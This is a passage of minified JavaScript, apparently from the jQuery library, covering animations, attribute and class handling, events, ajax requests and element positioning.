b=Sa||Wa(),c=Math.max(0,j.startTime+j.duration-b),d=c/j.duration||0,f=1-d,g=0,i=j.tweens.length;i>g;g++)j.tweens[g].run(f);return h.notifyWith(a,[j,f,c]),1>f&&i?c:(h.resolveWith(a,[j]),!1)},j=h.promise({elem:a,props:n.extend({},b),opts:n.extend(!0,{specialEasing:{},easing:n.easing._default},c),originalProperties:b,originalOptions:c,startTime:Sa||Wa(),duration:c.duration,tweens:[],createTween:function(b,c){var d=n.Tween(a,j.opts,b,c,j.opts.specialEasing[b]||j.opts.easing);return j.tweens.push(d),d},stop:function(b){var c=0,d=b?j.tweens.length:0;if(e)return this;for(e=!0;d>c;c++)j.tweens[c].run(1);return b?(h.notifyWith(a,[j,1,0]),h.resolveWith(a,[j,b])):h.rejectWith(a,[j,b]),this}}),k=j.props;for($a(k,j.opts.specialEasing);g>f;f++)if(d=_a.prefilters[f].call(j,a,k,j.opts))return n.isFunction(d.stop)&&(n._queueHooks(j.elem,j.opts.queue).stop=n.proxy(d.stop,d)),d;return n.map(k,Ya,j),n.isFunction(j.opts.start)&&j.opts.start.call(a,j),n.fx.timer(n.extend(i,{elem:a,anim:j,queue:j.opts.queue})),j.progress(j.opts.progress).done(j.opts.done,j.opts.complete).fail(j.opts.fail).always(j.opts.always)}n.Animation=n.extend(_a,{tweeners:{"*":[function(a,b){var c=this.createTween(a,b);return W(c.elem,a,T.exec(b),c),c}]},tweener:function(a,b){n.isFunction(a)?(b=a,a=["*"]):a=a.match(G);for(var c,d=0,e=a.length;e>d;d++)c=a[d],_a.tweeners[c]=_a.tweeners[c]||[],_a.tweeners[c].unshift(b)},prefilters:[Za],prefilter:function(a,b){b?_a.prefilters.unshift(a):_a.prefilters.push(a)}}),n.speed=function(a,b,c){var d=a&&"object"==typeof a?n.extend({},a):{complete:c||!c&&b||n.isFunction(a)&&a,duration:a,easing:c&&b||b&&!n.isFunction(b)&&b};return d.duration=n.fx.off?0:"number"==typeof d.duration?d.duration:d.duration in n.fx.speeds?n.fx.speeds[d.duration]:n.fx.speeds._default,null!=d.queue&&d.queue!==!0||(d.queue="fx"),d.old=d.complete,d.complete=function(){n.isFunction(d.old)&&d.old.call(this),d.queue&&n.dequeue(this,d.queue)},d},n.fn.extend({fadeTo:function(a,b,c,d){return this.filter(V).css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=n.isEmptyObject(a),f=n.speed(b,c,d),g=function(){var b=_a(this,n.extend({},a),f);(e||N.get(this,"finish"))&&b.stop(!0)};return g.finish=g,e||f.queue===!1?this.each(g):this.queue(f.queue,g)},stop:function(a,b,c){var d=function(a){var b=a.stop;delete a.stop,b(c)};return"string"!=typeof a&&(c=b,b=a,a=void 0),b&&a!==!1&&this.queue(a||"fx",[]),this.each(function(){var b=!0,e=null!=a&&a+"queueHooks",f=n.timers,g=N.get(this);if(e)g[e]&&g[e].stop&&d(g[e]);else for(e in g)g[e]&&g[e].stop&&Va.test(e)&&d(g[e]);for(e=f.length;e--;)f[e].elem!==this||null!=a&&f[e].queue!==a||(f[e].anim.stop(c),b=!1,f.splice(e,1));!b&&c||n.dequeue(this,a)})},finish:function(a){return a!==!1&&(a=a||"fx"),this.each(function(){var b,c=N.get(this),d=c[a+"queue"],e=c[a+"queueHooks"],f=n.timers,g=d?d.length:0;for(c.finish=!0,n.queue(this,a,[]),e&&e.stop&&e.stop.call(this,!0),b=f.length;b--;)f[b].elem===this&&f[b].queue===a&&(f[b].anim.stop(!0),f.splice(b,1));for(b=0;g>b;b++)d[b]&&d[b].finish&&d[b].finish.call(this);delete c.finish})}}),n.each(["toggle","show","hide"],function(a,b){var c=n.fn[b];n.fn[b]=function(a,d,e){return null==a||"boolean"==typeof a?c.apply(this,arguments):this.animate(Xa(b,!0),a,d,e)}}),n.each({slideDown:Xa("show"),slideUp:Xa("hide"),slideToggle:Xa("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){n.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),n.timers=[],n.fx.tick=function(){var a,b=0,c=n.timers;for(Sa=n.now();b<c.length;b++)a=c[b],a()||c[b]!==a||c.splice(b--,1);c.length||n.fx.stop(),Sa=void 0},n.fx.timer=function(a){n.timers.push(a),a()?n.fx.start():n.timers.pop()},n.fx.interval=13,n.fx.start=function(){Ta||(Ta=a.setInterval(n.fx.tick,n.fx.interval))},n.fx.stop=function(){a.clearInterval(Ta),Ta=null},n.fx.speeds={slow:600,fast:200,_default:400},n.fn.delay=function(b,c){return b=n.fx?n.fx.speeds[b]||b:b,c=c||"fx",this.queue(c,function(c,d){var e=a.setTimeout(c,b);d.stop=function(){a.clearTimeout(e)}})},function(){var a=d.createElement("input"),b=d.createElement("select"),c=b.appendChild(d.createElement("option"));a.type="checkbox",l.checkOn=""!==a.value,l.optSelected=c.selected,b.disabled=!0,l.optDisabled=!c.disabled,a=d.createElement("input"),a.value="t",a.type="radio",l.radioValue="t"===a.value}();var ab,bb=n.expr.attrHandle;n.fn.extend({attr:function(a,b){return K(this,n.attr,a,b,arguments.length>1)},removeAttr:function(a){return this.each(function(){n.removeAttr(this,a)})}}),n.extend({attr:function(a,b,c){var d,e,f=a.nodeType;if(3!==f&&8!==f&&2!==f)return"undefined"==typeof a.getAttribute?n.prop(a,b,c):(1===f&&n.isXMLDoc(a)||(b=b.toLowerCase(),e=n.attrHooks[b]||(n.expr.match.bool.test(b)?ab:void 0)),void 0!==c?null===c?void n.removeAttr(a,b):e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:(a.setAttribute(b,c+""),c):e&&"get"in e&&null!==(d=e.get(a,b))?d:(d=n.find.attr(a,b),null==d?void 0:d))},attrHooks:{type:{set:function(a,b){if(!l.radioValue&&"radio"===b&&n.nodeName(a,"input")){var c=a.value;return a.setAttribute("type",b),c&&(a.value=c),b}}}},removeAttr:function(a,b){var c,d,e=0,f=b&&b.match(G);if(f&&1===a.nodeType)while(c=f[e++])d=n.propFix[c]||c,n.expr.match.bool.test(c)&&(a[d]=!1),a.removeAttribute(c)}}),ab={set:function(a,b,c){return b===!1?n.removeAttr(a,c):a.setAttribute(c,c),c}},n.each(n.expr.match.bool.source.match(/\w+/g),function(a,b){var c=bb[b]||n.find.attr;bb[b]=function(a,b,d){var e,f;return d||(f=bb[b],bb[b]=e,e=null!=c(a,b,d)?b.toLowerCase():null,bb[b]=f),e}});var cb=/^(?:input|select|textarea|button)$/i,db=/^(?:a|area)$/i;n.fn.extend({prop:function(a,b){return K(this,n.prop,a,b,arguments.length>1)},removeProp:function(a){return this.each(function(){delete this[n.propFix[a]||a]})}}),n.extend({prop:function(a,b,c){var d,e,f=a.nodeType;if(3!==f&&8!==f&&2!==f)return 1===f&&n.isXMLDoc(a)||(b=n.propFix[b]||b,
e=n.propHooks[b]),void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!==(d=e.get(a,b))?d:a[b]},propHooks:{tabIndex:{get:function(a){var b=n.find.attr(a,"tabindex");return b?parseInt(b,10):cb.test(a.nodeName)||db.test(a.nodeName)&&a.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),l.optSelected||(n.propHooks.selected={get:function(a){var b=a.parentNode;return b&&b.parentNode&&b.parentNode.selectedIndex,null},set:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex)}}),n.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){n.propFix[this.toLowerCase()]=this});var eb=/[\t\r\n\f]/g;function fb(a){return a.getAttribute&&a.getAttribute("class")||""}n.fn.extend({addClass:function(a){var b,c,d,e,f,g,h,i=0;if(n.isFunction(a))return this.each(function(b){n(this).addClass(a.call(this,b,fb(this)))});if("string"==typeof a&&a){b=a.match(G)||[];while(c=this[i++])if(e=fb(c),d=1===c.nodeType&&(" "+e+" ").replace(eb," ")){g=0;while(f=b[g++])d.indexOf(" "+f+" ")<0&&(d+=f+" ");h=n.trim(d),e!==h&&c.setAttribute("class",h)}}return this},removeClass:function(a){var b,c,d,e,f,g,h,i=0;if(n.isFunction(a))return this.each(function(b){n(this).removeClass(a.call(this,b,fb(this)))});if(!arguments.length)return this.attr("class","");if("string"==typeof a&&a){b=a.match(G)||[];while(c=this[i++])if(e=fb(c),d=1===c.nodeType&&(" "+e+" ").replace(eb," ")){g=0;while(f=b[g++])while(d.indexOf(" "+f+" ")>-1)d=d.replace(" "+f+" "," ");h=n.trim(d),e!==h&&c.setAttribute("class",h)}}return this},toggleClass:function(a,b){var c=typeof a;return"boolean"==typeof b&&"string"===c?b?this.addClass(a):this.removeClass(a):n.isFunction(a)?this.each(function(c){n(this).toggleClass(a.call(this,c,fb(this),b),b)}):this.each(function(){var b,d,e,f;if("string"===c){d=0,e=n(this),f=a.match(G)||[];while(b=f[d++])e.hasClass(b)?e.removeClass(b):e.addClass(b)}else void 0!==a&&"boolean"!==c||(b=fb(this),b&&N.set(this,"__className__",b),this.setAttribute&&this.setAttribute("class",b||a===!1?"":N.get(this,"__className__")||""))})},hasClass:function(a){var b,c,d=0;b=" "+a+" ";while(c=this[d++])if(1===c.nodeType&&(" "+fb(c)+" ").replace(eb," ").indexOf(b)>-1)return!0;return!1}});var gb=/\r/g,hb=/[\x20\t\r\n\f]+/g;n.fn.extend({val:function(a){var b,c,d,e=this[0];{if(arguments.length)return d=n.isFunction(a),this.each(function(c){var e;1===this.nodeType&&(e=d?a.call(this,c,n(this).val()):a,null==e?e="":"number"==typeof e?e+="":n.isArray(e)&&(e=n.map(e,function(a){return null==a?"":a+""})),b=n.valHooks[this.type]||n.valHooks[this.nodeName.toLowerCase()],b&&"set"in b&&void 0!==b.set(this,e,"value")||(this.value=e))});if(e)return b=n.valHooks[e.type]||n.valHooks[e.nodeName.toLowerCase()],b&&"get"in b&&void 0!==(c=b.get(e,"value"))?c:(c=e.value,"string"==typeof c?c.replace(gb,""):null==c?"":c)}}}),n.extend({valHooks:{option:{get:function(a){var b=n.find.attr(a,"value");return null!=b?b:n.trim(n.text(a)).replace(hb," ")}},select:{get:function(a){for(var b,c,d=a.options,e=a.selectedIndex,f="select-one"===a.type||0>e,g=f?null:[],h=f?e+1:d.length,i=0>e?h:f?e:0;h>i;i++)if(c=d[i],(c.selected||i===e)&&(l.optDisabled?!c.disabled:null===c.getAttribute("disabled"))&&(!c.parentNode.disabled||!n.nodeName(c.parentNode,"optgroup"))){if(b=n(c).val(),f)return b;g.push(b)}return g},set:function(a,b){var c,d,e=a.options,f=n.makeArray(b),g=e.length;while(g--)d=e[g],(d.selected=n.inArray(n.valHooks.option.get(d),f)>-1)&&(c=!0);return c||(a.selectedIndex=-1),f}}}}),n.each(["radio","checkbox"],function(){n.valHooks[this]={set:function(a,b){return n.isArray(b)?a.checked=n.inArray(n(a).val(),b)>-1:void 0}},l.checkOn||(n.valHooks[this].get=function(a){return null===a.getAttribute("value")?"on":a.value})});var ib=/^(?:focusinfocus|focusoutblur)$/;n.extend(n.event,{trigger:function(b,c,e,f){var g,h,i,j,l,m,o,p=[e||d],q=k.call(b,"type")?b.type:b,r=k.call(b,"namespace")?b.namespace.split("."):[];if(h=i=e=e||d,3!==e.nodeType&&8!==e.nodeType&&!ib.test(q+n.event.triggered)&&(q.indexOf(".")>-1&&(r=q.split("."),q=r.shift(),r.sort()),l=q.indexOf(":")<0&&"on"+q,b=b[n.expando]?b:new n.Event(q,"object"==typeof b&&b),b.isTrigger=f?2:3,b.namespace=r.join("."),b.rnamespace=b.namespace?new RegExp("(^|\\.)"+r.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,b.result=void 0,b.target||(b.target=e),c=null==c?[b]:n.makeArray(c,[b]),o=n.event.special[q]||{},f||!o.trigger||o.trigger.apply(e,c)!==!1)){if(!f&&!o.noBubble&&!n.isWindow(e)){for(j=o.delegateType||q,ib.test(j+q)||(h=h.parentNode);h;h=h.parentNode)p.push(h),i=h;i===(e.ownerDocument||d)&&p.push(i.defaultView||i.parentWindow||a)}g=0;while((h=p[g++])&&!b.isPropagationStopped())b.type=g>1?j:o.bindType||q,m=(N.get(h,"events")||{})[b.type]&&N.get(h,"handle"),m&&m.apply(h,c),m=l&&h[l],m&&m.apply&&L(h)&&(b.result=m.apply(h,c),b.result===!1&&b.preventDefault());return b.type=q,f||b.isDefaultPrevented()||o._default&&o._default.apply(p.pop(),c)!==!1||!L(e)||l&&n.isFunction(e[q])&&!n.isWindow(e)&&(i=e[l],i&&(e[l]=null),n.event.triggered=q,e[q](),n.event.triggered=void 0,i&&(e[l]=i)),b.result}},simulate:function(a,b,c){var d=n.extend(new n.Event,c,{type:a,isSimulated:!0});n.event.trigger(d,null,b),d.isDefaultPrevented()&&c.preventDefault()}}),n.fn.extend({trigger:function(a,b){return this.each(function(){n.event.trigger(a,b,this)})},triggerHandler:function(a,b){var c=this[0];return c?n.event.trigger(a,b,c,!0):void 0}}),n.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){n.fn[b]=function(a,c){return arguments.length>0?this.on(b,null,a,c):this.trigger(b)}}),n.fn.extend({hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}}),l.focusin="onfocusin"in a,l.focusin||n.each({focus:"focusin",blur:"focusout"},function(a,b){var c=function(a){n.event.simulate(b,a.target,n.event.fix(a))};n.event.special[b]={setup:function(){var d=this.ownerDocument||this,e=N.access(d,b);e||d.addEventListener(a,c,!0),N.access(d,b,(e||0)+1)},teardown:function(){var d=this.ownerDocument||this,e=N.access(d,b)-1;e?N.access(d,b,e):(d.removeEventListener(a,c,!0),N.remove(d,b))}}});var jb=a.location,kb=n.now(),lb=/\?/;n.parseJSON=function(a){return JSON.parse(a+"")},n.parseXML=function(b){var c;if(!b||"string"!=typeof b)return null;try{c=(new a.DOMParser).parseFromString(b,"text/xml")}catch(d){c=void 0}return c&&!c.getElementsByTagName("parsererror").length||n.error("Invalid XML: "+b),c};var mb=/#.*$/,nb=/([?&])_=[^&]*/,ob=/^(.*?):[ \t]*([^\r\n]*)$/gm,pb=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,qb=/^(?:GET|HEAD)$/,rb=/^\/\//,sb={},tb={},ub="*/".concat("*"),vb=d.createElement("a");vb.href=jb.href;function wb(a){return function(b,c){"string"!=typeof b&&(c=b,b="*");var d,e=0,f=b.toLowerCase().match(G)||[];if(n.isFunction(c))while(d=f[e++])"+"===d[0]?(d=d.slice(1)||"*",(a[d]=a[d]||[]).unshift(c)):(a[d]=a[d]||[]).push(c)}}function xb(a,b,c,d){var e={},f=a===tb;function g(h){var i;return e[h]=!0,n.each(a[h]||[],function(a,h){var j=h(b,c,d);return"string"!=typeof j||f||e[j]?f?!(i=j):void 0:(b.dataTypes.unshift(j),g(j),!1)}),i}return g(b.dataTypes[0])||!e["*"]&&g("*")}function yb(a,b){var c,d,e=n.ajaxSettings.flatOptions||{};for(c in b)void 0!==b[c]&&((e[c]?a:d||(d={}))[c]=b[c]);return d&&n.extend(!0,a,d),a}function zb(a,b,c){var d,e,f,g,h=a.contents,i=a.dataTypes;while("*"===i[0])i.shift(),void 0===d&&(d=a.mimeType||b.getResponseHeader("Content-Type"));if(d)for(e in h)if(h[e]&&h[e].test(d)){i.unshift(e);break}if(i[0]in c)f=i[0];else{for(e in c){if(!i[0]||a.converters[e+" "+i[0]]){f=e;break}g||(g=e)}f=f||g}return f?(f!==i[0]&&i.unshift(f),c[f]):void 0}function Ab(a,b,c,d){var e,f,g,h,i,j={},k=a.dataTypes.slice();if(k[1])for(g in a.converters)j[g.toLowerCase()]=a.converters[g];f=k.shift();while(f)if(a.responseFields[f]&&(c[a.responseFields[f]]=b),!i&&d&&a.dataFilter&&(b=a.dataFilter(b,a.dataType)),i=f,f=k.shift())if("*"===f)f=i;else if("*"!==i&&i!==f){if(g=j[i+" "+f]||j["* "+f],!g)for(e in j)if(h=e.split(" "),h[1]===f&&(g=j[i+" "+h[0]]||j["* "+h[0]])){g===!0?g=j[e]:j[e]!==!0&&(f=h[0],k.unshift(h[1]));break}if(g!==!0)if(g&&a["throws"])b=g(b);else try{b=g(b)}catch(l){return{state:"parsererror",error:g?l:"No conversion from "+i+" to "+f}}}return{state:"success",data:b}}n.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:jb.href,type:"GET",isLocal:pb.test(jb.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":ub,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":n.parseJSON,"text xml":n.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(a,b){return b?yb(yb(a,n.ajaxSettings),b):yb(n.ajaxSettings,a)},ajaxPrefilter:wb(sb),ajaxTransport:wb(tb),ajax:function(b,c){"object"==typeof b&&(c=b,b=void 0),c=c||{};var e,f,g,h,i,j,k,l,m=n.ajaxSetup({},c),o=m.context||m,p=m.context&&(o.nodeType||o.jquery)?n(o):n.event,q=n.Deferred(),r=n.Callbacks("once memory"),s=m.statusCode||{},t={},u={},v=0,w="canceled",x={readyState:0,getResponseHeader:function(a){var b;if(2===v){if(!h){h={};while(b=ob.exec(g))h[b[1].toLowerCase()]=b[2]}b=h[a.toLowerCase()]}return null==b?null:b},getAllResponseHeaders:function(){return 2===v?g:null},setRequestHeader:function(a,b){var c=a.toLowerCase();return v||(a=u[c]=u[c]||a,t[a]=b),this},overrideMimeType:function(a){return v||(m.mimeType=a),this},statusCode:function(a){var b;if(a)if(2>v)for(b in a)s[b]=[s[b],a[b]];else x.always(a[x.status]);return this},abort:function(a){var b=a||w;return e&&e.abort(b),z(0,b),this}};if(q.promise(x).complete=r.add,x.success=x.done,x.error=x.fail,m.url=((b||m.url||jb.href)+"").replace(mb,"").replace(rb,jb.protocol+"//"),m.type=c.method||c.type||m.method||m.type,m.dataTypes=n.trim(m.dataType||"*").toLowerCase().match(G)||[""],null==m.crossDomain){j=d.createElement("a");try{j.href=m.url,j.href=j.href,m.crossDomain=vb.protocol+"//"+vb.host!=j.protocol+"//"+j.host}catch(y){m.crossDomain=!0}}if(m.data&&m.processData&&"string"!=typeof m.data&&(m.data=n.param(m.data,m.traditional)),xb(sb,m,c,x),2===v)return x;k=n.event&&m.global,k&&0===n.active++&&n.event.trigger("ajaxStart"),m.type=m.type.toUpperCase(),m.hasContent=!qb.test(m.type),f=m.url,m.hasContent||(m.data&&(f=m.url+=(lb.test(f)?"&":"?")+m.data,delete m.data),m.cache===!1&&(m.url=nb.test(f)?f.replace(nb,"$1_="+kb++):f+(lb.test(f)?"&":"?")+"_="+kb++)),m.ifModified&&(n.lastModified[f]&&x.setRequestHeader("If-Modified-Since",n.lastModified[f]),n.etag[f]&&x.setRequestHeader("If-None-Match",n.etag[f])),(m.data&&m.hasContent&&m.contentType!==!1||c.contentType)&&x.setRequestHeader("Content-Type",m.contentType),x.setRequestHeader("Accept",m.dataTypes[0]&&m.accepts[m.dataTypes[0]]?m.accepts[m.dataTypes[0]]+("*"!==m.dataTypes[0]?", "+ub+"; q=0.01":""):m.accepts["*"]);for(l in m.headers)x.setRequestHeader(l,m.headers[l]);if(m.beforeSend&&(m.beforeSend.call(o,x,m)===!1||2===v))return x.abort();w="abort";for(l in{success:1,error:1,complete:1})x[l](m[l]);if(e=xb(tb,m,c,x)){if(x.readyState=1,k&&p.trigger("ajaxSend",[x,m]),2===v)return x;m.async&&m.timeout>0&&(i=a.setTimeout(function(){x.abort("timeout")},m.timeout));try{v=1,e.send(t,z)}catch(y){if(!(2>v))throw y;z(-1,y)}}else z(-1,"No Transport");function z(b,c,d,h){var j,l,t,u,w,y=c;2!==v&&(v=2,i&&a.clearTimeout(i),e=void 0,g=h||"",x.readyState=b>0?4:0,j=b>=200&&300>b||304===b,d&&(u=zb(m,x,d)),u=Ab(m,u,x,j),j?(m.ifModified&&(w=x.getResponseHeader("Last-Modified"),w&&(n.lastModified[f]=w),w=x.getResponseHeader("etag"),w&&(n.etag[f]=w)),204===b||"HEAD"===m.type?y="nocontent":304===b?y="notmodified":(y=u.state,l=u.data,t=u.error,j=!t)):(t=y,!b&&y||(y="error",0>b&&(b=0))),x.status=b,x.statusText=(c||y)+"",j?q.resolveWith(o,[l,y,x]):q.rejectWith(o,[x,y,t]),x.statusCode(s),s=void 0,k&&p.trigger(j?"ajaxSuccess":"ajaxError",[x,m,j?l:t]),r.fireWith(o,[x,y]),k&&(p.trigger("ajaxComplete",[x,m]),--n.active||n.event.trigger("ajaxStop")))}return x},getJSON:function(a,b,c){return n.get(a,b,c,"json")},getScript:function(a,b){return n.get(a,void 0,b,"script")}}),n.each(["get","post"],function(a,b){n[b]=function(a,c,d,e){return n.isFunction(c)&&(e=e||d,d=c,c=void 0),n.ajax(n.extend({url:a,type:b,dataType:e,data:c,success:d},n.isPlainObject(a)&&a))}}),n._evalUrl=function(a){return n.ajax({url:a,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})},n.fn.extend({wrapAll:function(a){var b;return n.isFunction(a)?this.each(function(b){n(this).wrapAll(a.call(this,b))}):(this[0]&&(b=n(a,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstElementChild)a=a.firstElementChild;return a}).append(this)),this)},wrapInner:function(a){return n.isFunction(a)?this.each(function(b){n(this).wrapInner(a.call(this,b))}):this.each(function(){var b=n(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=n.isFunction(a);return this.each(function(c){n(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){n.nodeName(this,"body")||n(this).replaceWith(this.childNodes)}).end()}}),n.expr.filters.hidden=function(a){return!n.expr.filters.visible(a)},n.expr.filters.visible=function(a){return a.offsetWidth>0||a.offsetHeight>0||a.getClientRects().length>0};var Bb=/%20/g,Cb=/\[\]$/,Db=/\r?\n/g,Eb=/^(?:submit|button|image|reset|file)$/i,Fb=/^(?:input|select|textarea|keygen)/i;function Gb(a,b,c,d){var e;if(n.isArray(b))n.each(b,function(b,e){c||Cb.test(a)?d(a,e):Gb(a+"["+("object"==typeof e&&null!=e?b:"")+"]",e,c,d)});else if(c||"object"!==n.type(b))d(a,b);else for(e in b)Gb(a+"["+e+"]",b[e],c,d)}n.param=function(a,b){var c,d=[],e=function(a,b){b=n.isFunction(b)?b():null==b?"":b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};if(void 0===b&&(b=n.ajaxSettings&&n.ajaxSettings.traditional),n.isArray(a)||a.jquery&&!n.isPlainObject(a))n.each(a,function(){e(this.name,this.value)});else for(c in a)Gb(c,a[c],b,e);return d.join("&").replace(Bb,"+")},n.fn.extend({serialize:function(){return n.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var a=n.prop(this,"elements");return a?n.makeArray(a):this}).filter(function(){var a=this.type;return this.name&&!n(this).is(":disabled")&&Fb.test(this.nodeName)&&!Eb.test(a)&&(this.checked||!X.test(a))}).map(function(a,b){var c=n(this).val();return null==c?null:n.isArray(c)?n.map(c,function(a){return{name:b.name,value:a.replace(Db,"\r\n")}}):{name:b.name,value:c.replace(Db,"\r\n")}}).get()}}),n.ajaxSettings.xhr=function(){try{return new a.XMLHttpRequest}catch(b){}};var Hb={0:200,1223:204},Ib=n.ajaxSettings.xhr();l.cors=!!Ib&&"withCredentials"in Ib,l.ajax=Ib=!!Ib,n.ajaxTransport(function(b){var c,d;return l.cors||Ib&&!b.crossDomain?{send:function(e,f){var g,h=b.xhr();if(h.open(b.type,b.url,b.async,b.username,b.password),b.xhrFields)for(g in b.xhrFields)h[g]=b.xhrFields[g];b.mimeType&&h.overrideMimeType&&h.overrideMimeType(b.mimeType),b.crossDomain||e["X-Requested-With"]||(e["X-Requested-With"]="XMLHttpRequest");for(g in e)h.setRequestHeader(g,e[g]);c=function(a){return function(){c&&(c=d=h.onload=h.onerror=h.onabort=h.onreadystatechange=null,"abort"===a?h.abort():"error"===a?"number"!=typeof h.status?f(0,"error"):f(h.status,h.statusText):f(Hb[h.status]||h.status,h.statusText,"text"!==(h.responseType||"text")||"string"!=typeof h.responseText?{binary:h.response}:{text:h.responseText},h.getAllResponseHeaders()))}},h.onload=c(),d=h.onerror=c("error"),void 0!==h.onabort?h.onabort=d:h.onreadystatechange=function(){4===h.readyState&&a.setTimeout(function(){c&&d()})},c=c("abort");try{h.send(b.hasContent&&b.data||null)}catch(i){if(c)throw i}},abort:function(){c&&c()}}:void 0}),n.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/\b(?:java|ecma)script\b/},converters:{"text script":function(a){return n.globalEval(a),a}}}),n.ajaxPrefilter("script",function(a){void 0===a.cache&&(a.cache=!1),a.crossDomain&&(a.type="GET")}),n.ajaxTransport("script",function(a){if(a.crossDomain){var b,c;return{send:function(e,f){b=n("<script>").prop({charset:a.scriptCharset,src:a.url}).on("load error",c=function(a){b.remove(),c=null,a&&f("error"===a.type?404:200,a.type)}),d.head.appendChild(b[0])},abort:function(){c&&c()}}}});var Jb=[],Kb=/(=)\?(?=&|$)|\?\?/;n.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var a=Jb.pop()||n.expando+"_"+kb++;return this[a]=!0,a}}),n.ajaxPrefilter("json jsonp",function(b,c,d){var e,f,g,h=b.jsonp!==!1&&(Kb.test(b.url)?"url":"string"==typeof b.data&&0===(b.contentType||"").indexOf("application/x-www-form-urlencoded")&&Kb.test(b.data)&&"data");return h||"jsonp"===b.dataTypes[0]?(e=b.jsonpCallback=n.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,h?b[h]=b[h].replace(Kb,"$1"+e):b.jsonp!==!1&&(b.url+=(lb.test(b.url)?"&":"?")+b.jsonp+"="+e),b.converters["script json"]=function(){return g||n.error(e+" was not called"),g[0]},b.dataTypes[0]="json",f=a[e],a[e]=function(){g=arguments},d.always(function(){void 0===f?n(a).removeProp(e):a[e]=f,b[e]&&(b.jsonpCallback=c.jsonpCallback,Jb.push(e)),g&&n.isFunction(f)&&f(g[0]),g=f=void 0}),"script"):void 0}),n.parseHTML=function(a,b,c){if(!a||"string"!=typeof a)return null;"boolean"==typeof b&&(c=b,b=!1),b=b||d;var e=x.exec(a),f=!c&&[];return e?[b.createElement(e[1])]:(e=ca([a],b,f),f&&f.length&&n(f).remove(),n.merge([],e.childNodes))};var Lb=n.fn.load;n.fn.load=function(a,b,c){if("string"!=typeof a&&Lb)return Lb.apply(this,arguments);var d,e,f,g=this,h=a.indexOf(" ");return h>-1&&(d=n.trim(a.slice(h)),a=a.slice(0,h)),n.isFunction(b)?(c=b,b=void 0):b&&"object"==typeof b&&(e="POST"),g.length>0&&n.ajax({url:a,type:e||"GET",dataType:"html",data:b}).done(function(a){f=arguments,g.html(d?n("<div>").append(n.parseHTML(a)).find(d):a)}).always(c&&function(a,b){g.each(function(){c.apply(g,f||[a.responseText,b,a])})}),this},n.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(a,b){n.fn[b]=function(a){return this.on(b,a)}}),n.expr.filters.animated=function(a){return n.grep(n.timers,function(b){return a===b.elem}).length};function Mb(a){return n.isWindow(a)?a:9===a.nodeType&&a.defaultView}n.offset={setOffset:function(a,b,c){var d,e,f,g,h,i,j,k=n.css(a,"position"),l=n(a),m={};"static"===k&&(a.style.position="relative"),h=l.offset(),f=n.css(a,"top"),i=n.css(a,"left"),j=("absolute"===k||"fixed"===k)&&(f+i).indexOf("auto")>-1,j?(d=l.position(),g=d.top,e=d.left):(g=parseFloat(f)||0,e=parseFloat(i)||0),n.isFunction(b)&&(b=b.call(a,c,n.extend({},h))),null!=b.top&&(m.top=b.top-h.top+g),null!=b.left&&(m.left=b.left-h.left+e),"using"in b?b.using.call(a,m):l.css(m)}},n.fn.extend({offset:function(a){if(arguments.length)return void 0===a?this:this.each(function(b){n.offset.setOffset(this,a,b)});var b,c,d=this[0],e={top:0,left:0},f=d&&d.ownerDocument;if(f)return b=f.documentElement,n.contains(b,d)?(e=d.getBoundingClientRect(),c=Mb(f),{top:e.top+c.pageYOffset-b.clientTop,left:e.left+c.pageXOffset-b.clientLeft}):e},position:function(){if(this[0]){var a,b,c=this[0],d={top:0,left:0};return"fixed"===n.css(c,"position")?b=c.getBoundingClientRect():(a=this.offsetParent(),b=this.offset(),n.nodeName(a[0],"html")||(d=a.offset()),d.top+=n.css(a[0],"borderTopWidth",!0),d.left+=n.css(a[0],"borderLeftWidth",!0)),{top:b.top-d.top-n.css(c,"marginTop",!0),left:b.left-d.left-n.css(c,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var a=this.offsetParent;while(a&&"static"===n.css(a,"position"))a=a.offsetParent;return a||Ea})}}),n.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(a,b){var c="pageYOffset"===b;n.fn[a]=function(d){return K(this,function(a,d,e){var f=Mb(a);return void 0===e?f?f[b]:a[d]:void(f?f.scrollTo(c?f.pageXOffset:e,c?e:f.pageYOffset):a[d]=e)},a,d,arguments.length)}}),n.each(["top","left"],function(a,b){n.cssHooks[b]=Ga(l.pixelPosition,function(a,c){return 